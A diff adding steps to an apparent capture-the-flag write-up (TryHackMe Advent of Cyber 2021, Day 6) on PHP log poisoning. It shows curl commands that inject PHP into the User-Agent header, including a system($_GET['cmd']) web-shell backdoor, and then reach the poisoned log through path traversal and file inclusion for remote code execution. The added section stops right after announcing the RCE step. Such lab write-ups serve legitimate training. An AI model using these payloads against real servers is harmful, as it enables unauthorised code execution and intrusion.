@@ -117,7 +117,38 @@ Run a command like the following
 
 Refresh the log page and scroll down to see your log. 
 
+![Confirming Successful Curl](AoC-2021_Photos/Day_6/17.0_AoC-Day-6_12-24-21-Confirming-Log-Poisoning-User-Agent.png)
 
+With the `curl` successful, let's try a `PHP` proof of concept, sending an actual piece of `PHP` code in a `curl` request as the `User-Agent`. 
+
+`curl -A "<?php phpinfo()?>" https://10-10-54-138.p.thmlabs.com/index.php`
+
+![PHP Proof of Concept](AoC-2021_Photos/Day_6/18.0_AoC-Day-6_12-24-21-PHP-PoC.png)
+
+With that, we have proof the `PHP` log poisoning works. The `User-Agent` will render as plain text, but actual `PHP` code should not run on the client side. Given we do not see the `User-Agent` and only see the page accessed, this is a success.
+
+Lets actually call the log file we were given earlier and see what `phpinfo()` does when called. 
+
+Log out and head to the original home-page at `index.php?err=error.txt` text in the URL bar and replace `error.txt` with the location of the log file &mdash; `./includes/logs/app_access.log`
+
+![Executed phpinfo()](AoC-2021_Photos/Day_6/19.0_AoC-Day-6_12-24-21-PHP-Code-Executed.png)
+
+Look at that! Our `PHP` code returned precisely what it was supposed to, info on the `PHP` running on the server. 
+
+This will happen in stages. First, we want to ensure the backdoor will work. Start with some more `PHP` code we can try and find on the server. 
+
+`curl -A "<?php echo 'n0_ware on your server    spaces     ';system(\$_GET['cmd']);?>" https://<YOUR-IP-WITH-DASHES>.p.thmlabs.com/index.php`
+
+To break this down....
+- `echo` will tell the system to print some random value to know that we have code execution
+- `;` is a delimeter to separate two statements. 
+- `system(\$_GET)` is the classic `PHP` backdoor, setting it up to that when we make a `GET` request with a parameter we can get any code execution that we want.
+- `['cmd']` is the parameter we want executed. It can be anything
+
+After curling this command, we are going to use [path traversal](../../../knowledge-base/vulnerabilities/path_traversal.md) to access `app_access.log` directly from the web root. 
+
+On the homepage with `index.php?err`, traverse the path with `=../../../../var/www/html/includes/logs/app/app_access.log`
+Finally, let's try an **RCE**. 
 Congratulations on completing the box! Continue on for the bonus challenge. 
 
 
